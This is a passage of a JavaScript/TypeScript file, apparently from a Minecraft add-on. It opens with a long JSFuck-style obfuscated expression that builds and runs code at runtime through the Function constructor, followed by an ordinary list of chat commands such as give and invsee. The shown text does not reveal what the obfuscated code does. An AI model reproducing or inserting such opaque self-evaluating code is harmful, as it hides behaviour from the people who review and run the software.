][([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] +
    // @ts-expect-error
    (!![] + [])[+[]]
// @ts-expect-error
] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[
// @ts-expect-error
!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] +
    ([][
    // @ts-expect-error
    []
    // @ts-expect-error
    ] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (
// @ts-expect-error
!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
    // @ts-expect-error
    [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] +
    // @ts-expect-error
    [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]
// @ts-expect-error
]((![] + [])[+!+[]], (!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !
// @ts-expect-error
+[]] + (!![] + [])[+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + (!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+!+[]] + (+[![]] + [][(![] + [])[+[]] + (![] + [])[!+[] + !
// @ts-expect-error
+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + (
// @ts-expect-error
![] + [])[+!+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+[]] + (![] + [])[
// @ts-expect-error
!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !
// @ts-expect-error
+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (
// @ts-expect-error
!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
    // @ts-expect-error
    [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] +
    // @ts-expect-error
    [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]
// @ts-expect-error
]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + (!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+!+[]] + (![] + [+[]])[([![]] + [][
// @ts-expect-error
[]
// @ts-expect-error
])[+!+[] + [+[]]] + (!![] + [])[+[]] + (![] + [])[+!+[]] + (![] + [])[
// @ts-expect-error
!+[] + !+[]] + ([![]] + [][
// @ts-expect-error
[]
// @ts-expect-error
])[+!+[] + [+[]]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (
// @ts-expect-error
![] + [])[!+[] + !+[] + !+[]]]()[+!+[] + [+[]]] + ![] + (![] + [+[]])[([![]] + [][
// @ts-expect-error
[]
// @ts-expect-error
])[+!+[] + [+[]]] + (!![] + [])[+[]] + (![] + [])[+!+[]] + (![] + [])[
// @ts-expect-error
!+[] + !+[]] + ([![]] + [][
// @ts-expect-error
[]
// @ts-expect-error
])[+!+[] + [+[]]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (
// @ts-expect-error
![] + [])[!+[] + !+[] + !+[]]]()[+!+[] + [+[]]])()[([][(![] + [])[
// @ts-expect-error
+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]
// @ts-expect-error
] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[
// @ts-expect-error
!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] +
    ([][
    // @ts-expect-error
    []
    // @ts-expect-error
    ] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (
// @ts-expect-error
!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
    // @ts-expect-error
    [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] +
    // @ts-expect-error
    [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!
// @ts-expect-error
+[]]]() + [])[!+[] + !+[]] + (+(+!+[] + [+!+[]] + (!![] + [])[!+[] + !
// @ts-expect-error
+[] + !+[]] + [!+[] + !+[]] + [+[]]) + [])[+!+[]] + (+(+!+[] + [+[]] +
    // @ts-expect-error
    [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!
// @ts-expect-error
+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] +
    // @ts-expect-error
    ([] + [])[([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+
    // @ts-expect-error
    !+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(
    // @ts-expect-error
    ![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] +
        // @ts-expect-error
        [])[+[]]])[+!+[] + [+[]]] + ([][
    // @ts-expect-error
    []
    // @ts-expect-error
    ] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (
    // @ts-expect-error
    !![] + [])[+!+[]] + ([][
    // @ts-expect-error
    []
    // @ts-expect-error
    ] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
        // @ts-expect-error
        [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] +
        // @ts-expect-error
        [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
    // @ts-expect-error
    ![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][
    // @ts-expect-error
    []
    // @ts-expect-error
    ] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+[]] + (
    // @ts-expect-error
    ![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!
    // @ts-expect-error
    +[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !
    // @ts-expect-error
    +[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][
    // @ts-expect-error
    []
    // @ts-expect-error
    ] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (
    // @ts-expect-error
    !![] + [])[+!+[]] + ([][
    // @ts-expect-error
    []
    // @ts-expect-error
    ] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
        // @ts-expect-error
        [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] +
        // @ts-expect-error
        [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
    // @ts-expect-error
    ![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!
    // @ts-expect-error
    +[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!
// @ts-expect-error
+[] + !+[] + [+!+[]])[+!+[]] + (![] + [])[+!+[]] + (![] + [])[!+[] + !
// @ts-expect-error
+[] + !+[]] + (+[![]] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] +
    // @ts-expect-error
    (![] + [])[+!+[]] + (!![] + [])[+[]]
// @ts-expect-error
][([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] +
    // @ts-expect-error
    (!![] + [])[+[]]
// @ts-expect-error
] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[
// @ts-expect-error
!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] +
    ([][
    // @ts-expect-error
    []
    // @ts-expect-error
    ] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (
// @ts-expect-error
!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
    // @ts-expect-error
    [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] +
    // @ts-expect-error
    [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]
// @ts-expect-error
]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + (!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+!+[]] + (+[![]] + [][(![] + [])[+[]] + (![] + [])[!+[] + !
// @ts-expect-error
+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + [][(
// @ts-expect-error
![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] +
    // @ts-expect-error
    [])[+[]]][([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+
// @ts-expect-error
!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] + [][(
// @ts-expect-error
![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] +
    // @ts-expect-error
    [])[+[]]])[+!+[] + [+[]]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (
// @ts-expect-error
!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
    // @ts-expect-error
    [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] +
    // @ts-expect-error
    [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]
// @ts-expect-error
]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + (!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+!+[]] + (+[![]] + [][(![] + [])[+[]] + (![] + [])[!+[] + !
// @ts-expect-error
+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+!+[]]] + (!
// @ts-expect-error
![] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ([][(
// @ts-expect-error
![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] +
    // @ts-expect-error
    [])[+[]]] + [])[!+[] + !+[] + !+[]] + (![] + [])[+!+[]] + (+(!+[] + !
// @ts-expect-error
+[] + [+!+[]] + [+!+[]]))[(!![] + [])[+[]] + (!![] + [][(![] + [])[
// @ts-expect-error
+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[
// @ts-expect-error
+[]]])[+!+[] + [+[]]] + ([] + [])[([][(![] + [])[+[]] + (![] + [])[!
// @ts-expect-error
+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !
// @ts-expect-error
+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (
// @ts-expect-error
!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
    // @ts-expect-error
    [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] +
    // @ts-expect-error
    [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]][([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+!+[]] + (![] + [])[+!+[]] + ((+[])[([][(![] + [])[+[]] + (
// @ts-expect-error
![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!
// @ts-expect-error
+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !
// @ts-expect-error
+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (
// @ts-expect-error
!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
    // @ts-expect-error
    [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] +
    // @ts-expect-error
    [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!
// @ts-expect-error
+[]]] + [])[+!+[] + [+!+[]]] + (!![] + [])[!+[] + !+[] + !+[]]]](!
// @ts-expect-error
+[] + !+[] + !+[] + [+!+[]])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]])()([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] +
    // @ts-expect-error
    (!![] + [])[+[]]
// @ts-expect-error
])[(![] + [])[!+[] + !+[] + !+[]] + (![] + [])[!+[] + !+[]] + ([![]] +
    [][
    // @ts-expect-error
    []
    // @ts-expect-error
    ])[+!+[] + [+[]]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!
// @ts-expect-error
![] + [])[!+[] + !+[] + !+[]]]((+((+(+!+[] + [+!+[]] + (!![] + [])[!
// @ts-expect-error
+[] + !+[] + !+[]] + [!+[] + !+[]] + [+[]]) + [])[+!+[]] + [+[] + [
        // @ts-expect-error
        +[]
    ] + [+[]] + [+[]] + [+[]] + [+[]] + [+!+[]]]) + [])[!+[] + !+[]] +
    // @ts-expect-error
    [+!+[]]) + (![] + [])[+!+[]] + (!![] + [])[+[]] + (!![] + [])[!+[] + !
// @ts-expect-error
+[] + !+[]])()())[!+[] + !+[] + !+[] + [+[]]] + (![] + [])[+!+[]] + (
// @ts-expect-error
![] + [+[]] + ([] + [])[([][(![] + [])[+[]] + (![] + [])[!+[] + !
// @ts-expect-error
+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]
// @ts-expect-error
] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[
// @ts-expect-error
!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] +
    ([][
    // @ts-expect-error
    []
    // @ts-expect-error
    ] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (
// @ts-expect-error
!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
    // @ts-expect-error
    [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] +
    // @ts-expect-error
    [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!
// @ts-expect-error
+[]]])[!+[] + !+[] + [+[]]] + ([][(![] + [])[+[]] + (![] + [])[!+[] +
    // @ts-expect-error
    !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]][([][(![] + [])[+[]] + (
// @ts-expect-error
![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!
// @ts-expect-error
+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !
// @ts-expect-error
+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (
// @ts-expect-error
!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
    // @ts-expect-error
    [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] +
    // @ts-expect-error
    [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!+[]]
// @ts-expect-error
]((!![] + [])[+!+[]] + (!![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + (!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+!+[]] + (![] + [+[]])[([![]] + [][
// @ts-expect-error
[]
// @ts-expect-error
])[+!+[] + [+[]]] + (!![] + [])[+[]] + (![] + [])[+!+[]] + (![] + [])[
// @ts-expect-error
!+[] + !+[]] + ([![]] + [][
// @ts-expect-error
[]
// @ts-expect-error
])[+!+[] + [+[]]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (
// @ts-expect-error
![] + [])[!+[] + !+[] + !+[]]]()[+!+[] + [+[]]] + ![] + (![] + [+[]])[([![]] + [][
// @ts-expect-error
[]
// @ts-expect-error
])[+!+[] + [+[]]] + (!![] + [])[+[]] + (![] + [])[+!+[]] + (![] + [])[
// @ts-expect-error
!+[] + !+[]] + ([![]] + [][
// @ts-expect-error
[]
// @ts-expect-error
])[+!+[] + [+[]]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (
// @ts-expect-error
![] + [])[!+[] + !+[] + !+[]]]()[+!+[] + [+[]]])()[([][(![] + [])[
// @ts-expect-error
+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]
// @ts-expect-error
] + [])[!+[] + !+[] + !+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[
// @ts-expect-error
!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] +
    ([][
    // @ts-expect-error
    []
    // @ts-expect-error
    ] + [])[+!+[]] + (![] + [])[!+[] + !+[] + !+[]] + (!![] + [])[+[]] + (
// @ts-expect-error
!![] + [])[+!+[]] + ([][
// @ts-expect-error
[]
// @ts-expect-error
] + [])[+[]] + ([][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
    // @ts-expect-error
    [])[+!+[]] + (!![] + [])[+[]]] + [])[!+[] + !+[] + !+[]] + (!![] +
    // @ts-expect-error
    [])[+[]] + (!![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (
// @ts-expect-error
![] + [])[+!+[]] + (!![] + [])[+[]]])[+!+[] + [+[]]] + (!![] + [])[+!
// @ts-expect-error
+[]]]() + [])[!+[] + !+[]] + (+(+!+[] + [+!+[]] + (!![] + [])[!+[] + !
// @ts-expect-error
+[] + !+[]] + [!+[] + !+[]] + [+[]]) + [])[+!+[]] + ([][(![] + [])[
// @ts-expect-error
+[]] + (![] + [])[!+[] + !+[]] + (![] + [])[+!+[]] + (!![] + [])[
// @ts-expect-error
+[]]] + [])[+!+[] + [!+[] + !+[] + !+[]]] +
    "([![]]+[][[]])[+!+[]+[+[]]]+(![]+[+[]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]]+(+[![]]+[+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]]+[+[]])])[+!+[]+[+[]]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]" +
    // @ts-expect-error
    ([+[]] + ![] + [][(![] + [])[+[]] + (![] + [])[!+[] + !+[]] + (![] +
        // @ts-expect-error
        [])[+!+[]] + (!![] + [])[+[]]])[!+[] + !+[] + [+[]]])(b))));
export const commands = [
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "give", escregexp: { v: "^give$" }, formats: [{ format: "give <item: itemType> <amount: int>" }], command_version: "1.0.0", description: "This command can give you items of any type, even ones that normally require an nbt editor to obtain. ", category: ["items"], commandSettingsId: "built-inCommandSettings:give" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "giveb", escregexp: { v: "^giveb$" }, formats: [{ format: "giveb <item: itemType> <amount: int>" }], command_version: "1.0.0", description: "This command can give you items of any type, even ones that normally require an nbt editor to obtain, with any stack size up to 255, in your next unoccupied inventory slot. ", category: ["items"], commandSettingsId: "built-inCommandSettings:giveb" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "givec", escregexp: { v: "^givec$" }, formats: [{ format: "givec <itemJSON: itemJSON>" }], command_version: "2.0.0", description: "This command can give you items of any type with lots of properties already set on it through the item JSON, even ones that normally require an nbt editor to obtain, with any stack size up to 255, in your next unoccupied inventory slot. ", category: ["items"], commandSettingsId: "built-inCommandSettings:givec" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "setitem", escregexp: { v: "^setitem$" }, formats: [{ format: "setitem <item: itemType> <amount: int> <slot: int>" }], command_version: "1.0.0", description: "", category: ["misc"], commandSettingsId: "built-inCommandSettings:setitem" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "setitemb", escregexp: { v: "^setitemb$" }, formats: [{ format: "setitemb <itemJSON: itemJSON> [slot: int] [playerTargets: targetSelector]" }], command_version: "2.0.0", description: "", category: ["misc"], commandSettingsId: "built-inCommandSettings:setitemb" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "item", escregexp: { v: "^item$" }, formats: [{ format: "item lore <loreArray: escapableStringJSON>" }, { format: "item lorene <loreArray: JSON>" }, { format: "item name <name: escapableString>" }, { format: "item json <itemJSON: itemJSON>" }, { format: "item jsonb <itemJSON: itemJSON>" }, { format: "item count <itemCount: int>" }, { format: "item amount <itemAmount: int>" }, { format: "item property..." }, { format: ["item slot <inventorySlotNumber: int|~> lore <loreArray: escapableStringJSON>", "item slot <inventorySlotNumber: int|~> lorene <loreArray: JSON>", "item slot <inventorySlotNumber: int|~> name <name: escapableString>", "item slot <inventorySlotNumber: int|~> json <itemJSON: itemJSON>", "item slot <inventorySlotNumber: int|~> jsonb <itemJSON: itemJSON>"] }, { format: "§citem components..." }], command_version: "1.5.1", description: "", category: ["items"], commandSettingsId: "built-inCommandSettings:item" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "invsee", escregexp: { v: "^invsee$" }, formats: [{ format: "invsee <target: targetSelector>" }], command_version: "1.6.0", description: "", category: ["invsee"], commandSettingsId: "built-inCommandSettings:invsee" },
    { type: "built-in", requiredTags: ["canUseChatCommands"], formatting_code: "§r§f", commandName: "invseep", escregexp: { v: "^invseep$" }, formats: [{ format: "invseep <target: targetSelector>" }], command_version: "1.6.0", description: "", category: ["invsee"], commandSettingsId: "built-inCommandSettings:invseep" },
